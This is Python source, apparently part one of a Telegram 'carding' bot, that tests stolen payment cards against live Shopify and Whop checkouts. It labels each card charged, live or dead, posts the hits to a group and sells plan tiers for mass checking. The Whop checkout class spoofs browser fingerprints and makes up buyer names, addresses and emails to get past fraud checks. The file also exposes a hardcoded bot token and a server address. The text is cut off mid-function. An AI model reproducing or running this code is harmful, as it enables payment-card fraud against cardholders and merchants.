# ============================================================
#  BarkBot — FINAL v8.0 (Part 1/2)
# ============================================================

import asyncio, aiohttp, aiofiles, os, random, time, json, re, string, sys
import requests, uuid, base64, hashlib, logging, urllib.parse
from datetime import datetime, timedelta, timezone
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError
from urllib.parse import urlparse, quote, urlunparse, unquote

# ---------- CONFIG ----------
SHOPI_API_URL = 'http://5.175.222.144:8081/'
API_ID = 36879858
API_HASH = '31edb415db51ac8be94379cdb9bcb236'
BOT_TOKEN = '8853878922:AAGhRXMtw57c5-_lZBrU0w24q1gjCpCn8dM'
ADMIN_IDS = [8978995132]
HIT_GROUP_ID = -1004321624246
BOT_LINK = "https://t.me/BarkBot"
AUTO_PIN_CHARGED = True
FORCE_JOIN_CHANNELS = [
    {"id": -1004482899697, "name": "Channel", "url": "https://t.me/+9FlrKCwBZyZjNzQ1"},
    {"id": -1004321624246, "name": "Group",   "url": "https://t.me/+F7H4DU9rU9U2Nzc1"},
]

# ---------- FILES ----------
PREMIUM_FILE = 'premium.txt'
SITES_1_5_FILE = 'sites_1_5.txt'
SITES_10_20_FILE = 'sites_10_20.txt'
KEYS_FILE = 'keys.json'
BANNED_FILE = 'banned.txt'
PLANS_FILE = 'plans.json'
FEEDBACK_FILE = 'feedback.json'
BOT_STATUS_FILE = 'bot_status.json'
WELCOME_IMAGE_PATH = 'afuona.jpg'
USER_PLANS_FILE = 'user_plans.json'
PROXY_DIR = 'proxies'
os.makedirs(PROXY_DIR, exist_ok=True)

logging.basicConfig(level=logging.WARNING)

bot = None
def is_admin(user_id): return user_id in ADMIN_IDS

# ---------- STRIPE HITTER IMPORT ----------
try:
    from hitter import AsyncStripeChecker
    HITTER_AVAILABLE = True
except ImportError:
    HITTER_AVAILABLE = False
    logging.warning("hitter.py not found — Stripe Hitter disabled")

# ---------- PLAN SYSTEM ----------
PLAN_LIMITS = {
    "Free":     {"mass": 0,    "single": True,  "proxy": False, "workers": 5},
    "Sed":      {"mass": 50,   "single": True,  "proxy": True,  "workers": 10},
    "Pro":      {"mass": 500,  "single": True,  "proxy": True,  "workers": 20},
    "Bot Op":   {"mass": 5000, "single": True,  "proxy": True,  "workers": 25},
    "TeamMate": {"mass": 5000, "single": True,  "proxy": True,  "workers": 25},
    "Admin":    {"mass": 5000, "single": True,  "proxy": True,  "workers": 25},
    "Owner":    {"mass": 999999,"single": True, "proxy": True,  "workers": 30},
}
VALID_PLANS = list(PLAN_LIMITS.keys())

def get_user_plan(user_id):
    if is_admin(user_id): return "Owner"
    plans = load_json_file(USER_PLANS_FILE, {})
    uid = str(user_id)
    if uid not in plans: return "Free"
    data = plans[uid]
    exp = data.get("expires_at")
    if exp:
        try:
            if datetime.fromisoformat(exp) < datetime.now():
                del plans[uid]
                save_json_file(USER_PLANS_FILE, plans)
                return "Free"
        except: pass
    return data.get("plan", "Free")

def set_user_plan(user_id, plan, days):
    if plan not in VALID_PLANS: return False
    plans = load_json_file(USER_PLANS_FILE, {})
    expires = (datetime.now() + timedelta(days=days)).isoformat()
    plans[str(user_id)] = {"plan": plan, "expires_at": expires}
    save_json_file(USER_PLANS_FILE, plans)
    return True

def get_mass_limit(user_id):
    plan = get_user_plan(user_id)
    return PLAN_LIMITS.get(plan, {}).get("mass", 0)

def can_use_proxy(user_id):
    plan = get_user_plan(user_id)
    return PLAN_LIMITS.get(plan, {}).get("proxy", False)

def get_worker_count(user_id):
    plan = get_user_plan(user_id)
    return PLAN_LIMITS.get(plan, {}).get("workers", 5)

# ============================================================
#  BOLD ITALIC CONVERTER
# ============================================================
_BI_MAP = {
    'a': '𝚊', 'b': '𝚋', 'c': '𝚌', 'd': '𝚍', 'e': '𝚎', 'f': '𝚏', 'g': '𝚐',
    'h': '𝚑', 'i': '𝚒', 'j': '𝚓', 'k': '𝚔', 'l': '𝚕', 'm': '𝚖', 'n': '𝚗',
    'o': '𝚘', 'p': '𝚙', 'q': '𝚚', 'r': '𝚛', 's': '𝚜', 't': '𝚝', 'u': '𝚞',
    'v': '𝚟', 'w': '𝚠', 'x': '𝚡', 'y': '𝚢', 'z': '𝚣',
    'A': '𝙰', 'B': '𝙱', 'C': '𝙲', 'D': '𝙳', 'E': '𝙴', 'F': '𝙵', 'G': '𝙶',
    'H': '𝙷', 'I': '𝙸', 'J': '𝙹', 'K': '𝙺', 'L': '𝙻', 'M': '𝙼', 'N': '𝙽',
    'O': '𝙾', 'P': '𝙿', 'Q': '𝚀', 'R': '𝚁', 'S': '𝚂', 'T': '𝚃', 'U': '𝚄',
    'V': '𝚅', 'W': '𝚆', 'X': '𝚇', 'Y': '𝚈', 'Z': '𝚉',
    '0': '𝟶', '1': '𝟷', '2': '𝟸', '3': '𝟹', '4': '𝟺',
    '5': '𝟻', '6': '𝟼', '7': '𝟽', '8': '𝟾', '9': '𝟿',
    '.': '.', '_': '_', '-': '-', ' ': ' ',
}

def bold_italic(text):
    if not text: return text
    result = ''
    for ch in str(text):
        result += _BI_MAP.get(ch, ch)
    return result

# ---------- CUSTOM EMOJI IDs ----------
E = {
    "📌":"6154668949549092628","⚙️":"5339141594471742013","⚡":"5456140674028019486",
    "💳":"6242055415010429981","💠":"5870498447068502918","📝":"5444860552310457690",
    "🌐":"6129476453802188018","📊":"4911241630633165627","📦":"6154668949549092628",
    "📋":"5217877998937595307","⏳":"5215327832040811010","🚀":"6129532640564354033",
    "⚠️":"6154263010715111980","💎":"5287547831677112267","👋":"5411285122215332752",
    "💡":"6305559611743146203","📈":"5134457377428341766","🔢":"5841276284155467413",
    "🔥":"6129418815341077483","🔔":"6129652186684070216","🆓":"5116382939571028928",
    "👑":"6129792056589031358","🔍":"5305346287820895195","⏱️":"6334603778326529773",
    "💥":"5122933683820430249","📩":"6129479035077531636","👤":"4938653911507534983",
    "📅":"5251435231256272897","🔄":"5454245266305604993","🏦":"6318864007381911770",
    "🌍":"5287292843763713628","❌":"4956337889593000947","✅":"5287547831677112267",
    "💰":"4965219701572503640","🎯":"5287547831677112267","🔗":"6129589862413638401",
    "📱":"6154589436819541960","🟢":"5287687594207891363","🔐":"5219901967916084168",
    "📢":"6172513793784857602","👥":"5870684635282814568","⭐":"6321279450016690374",
    "🤖":"6267155617301037908","🔱":"6267160342767446992",
}

def premium_emoji(text):
    if not text: return text
    for e, eid in E.items():
        text = text.replace(e, f'<tg-emoji emoji-id="{eid}">{e}</tg-emoji>')
    return text

active_sessions = {}
whop_sessions = {}
hitter_sessions = {}
pending_price_range = {}
pending_site_range = {}

# ============================================================
#  DEAD INDICATORS
# ============================================================
_DEAD_INDICATORS = (
    'receipt id is empty','handle is empty','product id is empty','tax amount is empty',
    'payment method identifier is empty','invalid url','error in 1st req','error in 1 req','cloudflare',
    'connection failed','timed out','access denied','tlsv1 alert','ssl routines','could not resolve',
    'domain name not found','name or service not known','openssl ssl_connect','empty reply from server',
    'httperror504','http error','timeout','unreachable','ssl error','502','503','504','bad gateway',
    'service unavailable','gateway timeout','network error','connection reset','failed to detect product',
    'failed to create checkout','failed to tokenize card','failed to get proposal data','submit rejected',
    'submit rejected:','handle error','http 404','delivery_delivery_line_detail_changed',
    'delivery_address2_required','url rejected','malformed input','amount_too_small','amount too small',
    'site dead','captcha_required','captcha required','site errors','failed','all products sold out',
    'no_session_token','tokenize_fail','proxy dead','invalid proxy format','no proxy',
    'checkout error','checkout_error','post "https://shop.app','shop.app/checkout',
    'error in 1st','error in 1','could not resolve host','failed to connect','connection refused',
)
def is_dead_site_error(m):
    if not m: return True
    ml = str(m).lower()
    return any(k in ml for k in _DEAD_INDICATORS)

def is_real_approved(message):
    if not message: return False
    rl = str(message).lower()
    if is_dead_site_error(message): return False
    real_keywords = ['insufficient','insufficient_funds','bank_insufficient_funds',
                     'cvv','cvc','incorrect_zip','incorrect zip','invalid_cvv',
                     'incorrect_cvv','invalid cvc','incorrect cvc','incorrect_cvc',
                     '3ds','3d secure','authentication_required','three_d_secure','approved']
    return any(k in rl for k in real_keywords)

# ============================================================
#  FORCE JOIN
# ============================================================
async def is_user_joined(user_id):
    if is_admin(user_id): return True
    if bot is None: return True
    for ch in FORCE_JOIN_CHANNELS:
        try:
            try:
                res = await bot.get_permissions(ch["id"], user_id)
                if res.is_member: continue
                return False
            except Exception: pass
            try:
                await bot(GetParticipantRequest(channel=ch["id"], participant=user_id))
                continue
            except UserNotParticipantError: return False
            except Exception: continue
        except Exception: continue
    return True

def get_force_join_keyboard():
    return [
        [Button.url("📢 Join Channel", FORCE_JOIN_CHANNELS[0]["url"], style="primary"),
         Button.url("👥 Join Group", FORCE_JOIN_CHANNELS[1]["url"], style="primary")],
        [Button.inline("✅ Verify Joined", b"verify_join", style="success")]
    ]

# ============================================================
#  HELPERS
# ============================================================
def load_json_file(fp,default=None):
    if default is None: default={}
    if not os.path.exists(fp): return default
    try:
        with open(fp,'r',encoding='utf-8') as f: return json.load(f)
    except: return default
def save_json_file(fp,data):
    with open(fp,'w',encoding='utf-8') as f: json.dump(data,f,indent=2)
def get_bot_status(): return load_json_file(BOT_STATUS_FILE,{'status':'on'}).get('status','on')
def set_bot_status(s): save_json_file(BOT_STATUS_FILE,{'status':s})
def get_file_lines(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp,'r',encoding='utf-8',errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except: return []
def load_banned(): return get_file_lines(BANNED_FILE)
def is_banned(uid): return str(uid) in load_banned()
def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def is_premium(uid): return str(uid) in load_premium_users()
def load_sites_1_5(): return get_file_lines(SITES_1_5_FILE)
def load_sites_10_20(): return get_file_lines(SITES_10_20_FILE)

# ---------- PERSONAL PROXY HELPERS ----------
def get_user_proxy_file(user_id, gate="shopify"):
    return os.path.join(PROXY_DIR, f"{user_id}_{gate}.txt")
def load_user_proxies(user_id, gate="shopify"):
    return get_file_lines(get_user_proxy_file(user_id, gate))
def save_user_proxies(user_id, proxies, gate="shopify"):
    with open(get_user_proxy_file(user_id, gate), 'w', encoding='utf-8') as f:
        for p in proxies: f.write(f"{p}\n")
def get_proxies_for_check(user_id, gate="shopify"):
    user_p = load_user_proxies(user_id, gate)
    if user_p: return user_p
    if gate != "shopify":
        return load_user_proxies(user_id, "shopify")
    return []

def format_proxy_for_requests(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"):
        return proxy_str
    if proxy_str.startswith("http://") or proxy_str.startswith("https://"):
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    return f"http://{proxy_str}"

def test_proxy_connection(proxy_str):
    try:
        import requests
        proxies = {}
        formatted = format_proxy_for_requests(proxy_str)
        if formatted:
            proxies = {"http": formatted, "https": formatted}
        r = requests.get("http://ip-api.com/json", proxies=proxies, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return True, data.get('country', 'N/A'), data.get('query', 'N/A')
    except: pass
    return False, None, None

def generate_key(n=16): return ''.join(random.choices(string.ascii_uppercase+string.digits,k=n))
def extract_cc(text):
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{cv}" for c,m,y,cv in
            re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})',text)]
def mask_user_id(uid):
    s = str(uid)
    if len(s) <= 6: return s
    return s[:3] + "****" + s[-3:]

async def get_bin_info(card_number):
    try:
        bn=card_number[:6]
        to=aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=to) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{bn}') as r:
                if r.status!=200: return '-','-','-','-','-','-',''
                data=json.loads(await r.text())
                return (data.get('brand','-'),data.get('type','-'),data.get('level','-'),
                        data.get('bank','-'),data.get('country_name','-'),data.get('country_code','-'),data.get('country_flag',''))
    except: return '-','-','-','-','-','-',''

async def get_checker_mention(user_id):
    try:
        ent = await bot.get_entity(user_id)
        uname = getattr(ent, "username", None)
        if uname:
            return f'<a href="https://t.me/{uname}">{uname}</a>'
        fname = getattr(ent, "first_name", None)
        if fname: return fname
    except: pass
    return mask_user_id(user_id)

async def save_user_stats(user_id,success=False):
    f=f"user_{user_id}.json"; d=load_json_file(f,{})
    d['total_checks']=d.get('total_checks',0)+1
    if success: d['successful_checks']=d.get('successful_checks',0)+1
    save_json_file(f,d)

async def create_user_if_not_exists(user_id,username):
    f=f"user_{user_id}.json"
    if not os.path.exists(f):
        save_json_file(f,{'user_id':user_id,'username':username,'registered_at':datetime.now().isoformat(),
                         'total_checks':0,'successful_checks':0})

# ============================================================
#  HIT NOTIFICATION (Group - Short Format)
# ============================================================
async def send_hit_to_group(user_id, card, message, gateway, hit_type, price="0.0"):
    if not HIT_GROUP_ID or HIT_GROUP_ID == -1001234567890: return
    if hit_type == "Approved" and not is_real_approved(message): return
    try:
        checker_name = await get_checker_mention(user_id)
        if hit_type == "Charged":
            status_line = f'𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ⌁ <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>'
            resp_emoji = f' <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>'
        else:
            status_line = f'𝗟𝗶𝘃𝗲 𝗖𝗮𝗿𝗱 ⌁ <tg-emoji emoji-id="{E["💎"]}">💎</tg-emoji>'
            resp_emoji = f' <tg-emoji emoji-id="{E["🟢"]}">🟢</tg-emoji>'

        msg_bi = bold_italic(message[:40] if message else "SUCCESS")
        price_bi = bold_italic(price)
        gateway_bi = bold_italic(gateway)

        hit_msg = (
            f'[=] {status_line}\n'
            f'─────────────\n'
            f'[=] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⌁ {msg_bi}{resp_emoji}\n'
            f'[=] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ ${price_bi} 𝚄𝚂𝙳 ⌁ <tg-emoji emoji-id="{E["💰"]}">💰</tg-emoji>\n'
            f'[=] 𝗚𝗮𝘁𝗲 ⌁ {gateway_bi}\n'
            f'─────────────\n'
            f'[=] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ {checker_name}'
        )
        await bot.send_message(HIT_GROUP_ID, hit_msg, parse_mode='html', link_preview=False)
    except Exception as e:
        logging.warning(f"Hit group send failed: {e}")

# ============================================================
#  CHECK RESULT (DM - Detailed Format)
# ============================================================
async def send_check_result(user_id, card, status, message, gateway, price, elapsed, checker_name):
    try:
        bin_info = await get_bin_info(card.split('|')[0])
        brand, ctype, level, bank, country, ccode, flag = bin_info

        if status == "Charged":
            title = f'𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            status_text = f'𝙲𝚑𝚊𝚛𝚐𝚎𝚍 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        elif status == "Approved":
            title = f'𝗟𝗶𝘃𝗲 𝗖𝗮𝗿𝗱 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            status_text = f'𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        elif status == "Dead":
            title = f'𝗗𝗲𝗮𝗱 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            status_text = f'𝙳𝚎𝚊𝚍 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        else:
            title = f'𝗘𝗿𝗿𝗼𝗿 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
            status_text = f'𝙴𝚛𝚛𝚘𝚛 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'

        msg_bi = bold_italic(message[:60] if message else "UNKNOWN")
        brand_bi = bold_italic(brand); ctype_bi = bold_italic(ctype); level_bi = bold_italic(level)
        bank_bi = bold_italic(bank); country_bi = bold_italic(country)
        gateway_bi = bold_italic(gateway); price_bi = bold_italic(price)
        time_bi = bold_italic(str(round(elapsed,1)))

        result_msg = (
            f'[⌯] {title}\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n'
            f'[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_text}\n'
            f'[⌯] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {msg_bi} <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗕𝗜𝗡 ⌁ {brand_bi} · {ctype_bi} · {level_bi}\n'
            f'[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bank_bi}\n'
            f'[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {flag} {country_bi} ({ccode})\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⌁ {gateway_bi}\n'
            f'[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ ${price_bi} 𝚄𝚂𝙳 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] 𝗧𝗶𝗺𝗲 ⌁ {time_bi}𝚜 ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ {checker_name}'
        )
        sent = await bot.send_message(user_id, result_msg, parse_mode='html', link_preview=False)
        if status == "Charged" and AUTO_PIN_CHARGED:
            try: await bot.pin_message(user_id, sent.id, notify=False)
            except: pass
    except Exception as e:
        logging.warning(f"Check result send failed: {e}")

# ============================================================
#  SHOPIFY CHECK
# ============================================================
async def check_card(card, site, proxy):
    try:
        if len(card.split('|'))!=4:
            return {'status':'Invalid Format','message':'Invalid card format','card':card}
        if proxy:
            url=f"{SHOPI_API_URL}?{card}&proxy={proxy}"
        else:
            url=f"{SHOPI_API_URL}?{card}"
        to=aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=to) as s:
            async with s.get(url) as r:
                raw=await r.json(content_type=None)
        msg=raw.get('Response',''); price=raw.get('Price','-')
        gate=raw.get('Gate','Shopify Payments')
        charged=str(raw.get('Charged','False')).lower()=='true'
        approved=str(raw.get('Approved','False')).lower()=='true'
        rl=str(msg).lower()
        if is_dead_site_error(msg):
            return {'status':'Site Error','message':msg,'card':card,'retry':True,
                    'site':site,'gateway':gate,'price':price,'dead_site':True}
        charged_keywords = ['order_placed','order placed','order_completed','order completed',
                            'payment successful','thank you','charged','success',
                            'order_confirmed','order confirmed']
        if charged or any(k in rl for k in charged_keywords):
            return {'status':'Charged','message':msg,'card':card,'site':site,'gateway':gate,'price':price}
        approved_keywords = ['approved','insufficient','cvv','cvc','incorrect_zip',
                             'incorrect zip','invalid_cvv','incorrect_cvv','invalid cvc',
                             'incorrect cvc','3ds','3d secure','authentication_required']
        if approved or any(k in rl for k in approved_keywords):
            return {'status':'Approved','message':msg,'card':card,'site':site,'gateway':gate,'price':price}
        return {'status':'Dead','message':msg,'card':card,'site':site,'gateway':gate,'price':price}
    except asyncio.TimeoutError:
        return {'status':'Site Error','message':'Request timeout','card':card,'retry':True,'dead_site':True}
    except Exception as e:
        if is_dead_site_error(str(e)):
            return {'status':'Site Error','message':str(e),'card':card,'retry':True,'dead_site':True}
        return {'status':'Dead','message':str(e),'card':card,'gateway':'Unknown','price':'-'}

async def check_card_with_retry(card,sites,proxies,max_retries=1):
    if not sites: return {'status':'Dead','message':'No sites','card':card,'gateway':'Unknown','price':'-'}
    last=None
    for i in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies) if proxies else None
        r=await check_card(card, site, proxy)
        if not r.get('retry'): return r
        last=r
        if i<max_retries-1: await asyncio.sleep(0.2)
    return {'status':'Dead','message':'Site errors','card':card,
            'gateway':last.get('gateway','Unknown') if last else 'Unknown',
            'price':last.get('price','-') if last else '-','site':'Multiple'}

async def test_site(site, proxy):
    try:
        url = f"{SHOPI_API_URL}?5154623245618097|03|2032|156&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(url) as r:
                raw = await r.json(content_type=None)
        msg = str(raw.get('Response', '')).lower()
        dead_keywords = ['site dead','invalid url','could not resolve','http 404',
                         'handle error','failed to detect product','timed out',
                         'timeout','unreachable','connection failed','proxy dead',
                         'checkout error','checkout_error','shop.app/checkout']
        if any(k in msg for k in dead_keywords): return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except: return {'site': site, 'status': 'dead'}

# ============================================================
#  WHOP CHECKOUT
# ============================================================
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
]
_CH_UA_MAP = {
    "Chrome/152":'"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
    "Chrome/151":'"Chromium";v="151", "Not?A_Brand";v="24", "Google Chrome";v="151"',
}
def _pick_ua():
    ua = random.choice(_UA_POOL)
    for k,v in _CH_UA_MAP.items():
        if k in ua: return ua, v
    return ua, _CH_UA_MAP["Chrome/152"]

def _rand_screen():
    screens=[(1920,1080,1920,1040),(1366,768,1366,728),(1536,864,1536,824),(1440,900,1440,860),(1280,800,1280,760)]
    sw,sh,saw,sah=random.choice(screens)
    return (sw,sh,saw,sah,random.randint(800,min(sw,1400)),random.randint(600,min(sh,900)),
            random.choice([1.0,1.25,1.5,2.0]),random.choice([4,6,8,10,12,16]),
            random.choice([4,8,16,32]),random.choice(["America/New_York","America/Chicago","America/Los_Angeles"]))

def _rand_name():
    fn=["James","Michael","Robert","John","David","William","Richard","Joseph"]
    ln=["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis"]
    return f"{random.choice(fn)} {random.choice(ln)}"

def _rand_address():
    streets=["Main St","Oak Ave","Maple Dr","Cedar Ln","Pine Rd","Elm St","Park Ave","Washington St","Lake Dr"]
    l1=f"{random.randint(100,9999)} {random.choice(streets)}"
    l2=random.choice(["",f"Apt {random.randint(1,999)}",f"Unit {random.randint(1,99)}",""])
    return l1,l2

def _rand_city():
    cities=[("New York","NY","10001"),("Los Angeles","CA","90001"),("Chicago","IL","60601"),("Houston","TX","77001"),
            ("San Diego","CA","92101"),("Dallas","TX","75201"),("Austin","TX","78701"),("Seattle","WA","98101"),
            ("Denver","CO","80201"),("Boston","MA","02101"),("Miami","FL","33101"),("Atlanta","GA","30301")]
    c,s,z=random.choice(cities)
    return c,s,z[:-2]+str(random.randint(10,99))

def _gen_email():
    first=["james","michael","robert","john","david","alex","chris","jordan","taylor","morgan"]
    last=["smith","johnson","williams","brown","jones","garcia","miller","davis"]
    f,l=random.choice(first),random.choice(last)
    n,yr=random.randint(1,9999),random.randint(1990,2003)
    return f"{random.choice([f+'.'+l+str(n),f+'_'+l+str(n),f+l+str(yr),f[0]+l+str(n)])}@gmail.com"

def _wuid(): return "wuid_"+''.join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(20))
def _fingerprint(ua,sw,sh): return hashlib.md5(f"{ua}{sw}x{sh}en-US".encode()).hexdigest()

class WhopCheckout:
    WHOP="https://whop.com"; BT="https://js.basistheory.com"
    SEGAPI="https://segapi.whop.com"; TWHOP="https://t.whop.tw"
    SEG_WK="HdaLFHQxdC1JhuAQSAcAHevjq1rIACtZ"
    GQL_PLANS=("query HubFetchVisiblePlans($productId: ID!, $first: Int, $after: String) { publicProduct(id: $productId) { visiblePlans(after: $after, first: $first) { nodes { id free inStock formattedPeriodV2 releaseMethod stripeAccountId stripePublicKey initialPriceDueInCents initialPrice acceptedPaymentMethods baseCurrency rawInitialPrice rawRenewalPrice planType } } } }")
    GQL_ACCESS=("query coreFetchProductAccessLevel($companyRoute: String!, $accessPassId: ID) { resolveStorePageIds(companyOrAccessPassRoute: $companyRoute accessPassId: $accessPassId) { companyAccessLevel accessPassLevel } }")
    GQL_RELATED=("query coreFetchRelatedAccessPasses($accessPassId: ID!) { publicAccessPass(id: $accessPassId) { id relatedAccessPasses { id visibility title route headline shortenedDescription position customCta customCtaUrl defaultPlan { id free inStock formattedPeriodV2 releaseMethod rawInitialPrice rawRenewalPrice baseCurrency planType } } } }")

    def __init__(self, cfg):
        self.cfg = dict(cfg)
        ua, ch_ua = _pick_ua()
        if not self.cfg.get("user_agent"): self.cfg["user_agent"] = ua
        else:
            ua = self.cfg["user_agent"]
            ch_ua = next((v for k,v in _CH_UA_MAP.items() if k in ua), _CH_UA_MAP["Chrome/152"])
        self._ch_ua = ch_ua; self._mobile = "?0"
        self._platform = '"Windows"' if "Windows" in ua else '"macOS"'
        (self._sw,self._sh,self._saw,self._sah,self._iw,self._ih,self._dpr,
         self._cores,self._mem,self._tz) = _rand_screen()
        self._anon_id = str(uuid.uuid4()); self._wuid = _wuid()
        self._render_id = str(uuid.uuid4())
        self._fp = _fingerprint(self.cfg["user_agent"], self._sw, self._sh)
        if not self.cfg.get("billing_name"): self.cfg["billing_name"] = _rand_name()
        if not self.cfg.get("billing_line1"):
            l1, l2 = _rand_address()
            self.cfg["billing_line1"] = l1
            if not self.cfg.get("billing_line2"): self.cfg["billing_line2"] = l2
        if not self.cfg.get("billing_city"):
            c, s, z = _rand_city()
            self.cfg["billing_city"], self.cfg["billing_state"], self.cfg["billing_postal_code"] = c, s, z
        if self.cfg.get("product_url"): self._parse_url(self.cfg["product_url"])
        if not self.cfg.get("email"): self.cfg["email"] = _gen_email()
        self.checkout_id = None; self.client_secret = None; self.account_id = None
        self.tracking_id = None; self.bt_pub_key = None; self._blocked = False
        self.ssk = str(uuid.uuid4()); self._card_info = {}
        self._last_pay_id = ""; self._last_entry = None
        self._terms_required = False; self._custom_fields = []
        self._sentry_trace_id = uuid.uuid4().hex
        self._sentry_release = "4fba2eb4f0421733618817298c8bdad8ce8dc21a"
        self._sentry_pub_key = "c6989961c9181cc2db941b290d874f29"
        self._sentry_sample_rand = round(random.random(), 17)
        self._bt_pub_key_cache = {}
        self.sess = requests.Session()
        proxy = self.cfg.get("proxy", "")
        if proxy:
            if not proxy.startswith("http"): proxy = "http://" + proxy
            proxy = self._encode_proxy(proxy)
            self.sess.proxies = {"http": proxy, "https": proxy}
        self.sess.headers.update({"accept":"*/*","accept-language":"en-US,en;q=0.9",
            "cache-control":"no-cache","pragma":"no-cache","priority":"u=1, i",
            "sec-ch-ua":self._ch_ua,"sec-ch-ua-mobile":self._mobile,
            "sec-ch-ua-platform":self._platform,"sec-gpc":"1","user-agent":self.cfg["user_agent"]})

    def _parse_url(self, url):
        p = urlparse(url); parts = [x for x in p.path.strip("/").split("/") if x]
        if len(parts) >= 2: self.cfg["company_route"], self.cfg["access_pass_route"] = parts[0], parts[1]
        elif len(parts) == 1: self.cfg["company_route"] = self.cfg["access_pass_route"] = parts[0]
        from urllib.parse import parse_qs
        qs = parse_qs(p.query)
        self.cfg["affiliate_tag"] = qs["a"][0] if "a" in qs else self.cfg.get("affiliate_tag", "")

    @property
    def _ref(self):
        t = self.cfg.get("affiliate_tag", "")
        return f"{self.WHOP}/{self.cfg.get('company_route','')}/{self.cfg.get('access_pass_route','')}/?a={t}"
    @property
    def _ref_noslash(self):
        t = self.cfg.get("affiliate_tag", "")
        return f"{self.WHOP}/{self.cfg.get('company_route','')}/{self.cfg.get('access_pass_route','')}?a={t}"
    def _v1(self, p): return f"{self.WHOP}/api/v1/{p}"
    def _sentry(self):
        span_id = uuid.uuid4().hex[:16]
        trace = f"{self._sentry_trace_id}-{span_id}-1"
        baggage = (f"sentry-environment=production,sentry-release={self._sentry_release},"
                   f"sentry-public_key={self._sentry_pub_key},sentry-trace_id={self._sentry_trace_id},"
                   f"sentry-org_id=1320754,sentry-sampled=true,sentry-sample_rand={self._sentry_sample_rand},sentry-sample_rate=1")
        return {"sentry-trace": trace, "baggage": baggage}
    def _wh(self, no_ct=False):
        h = {"origin": self.WHOP, "referer": self._ref, "sec-fetch-dest": "empty",
             "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "x-ssk": self.ssk,
             "api-version-date": "2026-09-15", "whop-private-schema": "true",
             "x-fern-language": "JavaScript", "x-fern-runtime": "browser",
             "x-fern-runtime-version": self.cfg["user_agent"], **self._sentry()}
        if not no_ct: h["content-type"] = "application/json"
        return h
    def _gql_h(self):
        return {"content-type": "application/json", "origin": self.WHOP, "referer": self._ref,
                "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
                "sec-gpc": "1", "x-whop-api-proxy-key": "test", "x-whop-app-name": "web",
                "x-whop-force-new-permission-system": "true", "x-whop-introspection": "1",
                "api-version-date": "2026-09-15", "whop-private-schema": "true",
                "x-fern-language": "JavaScript", "x-fern-runtime": "browser",
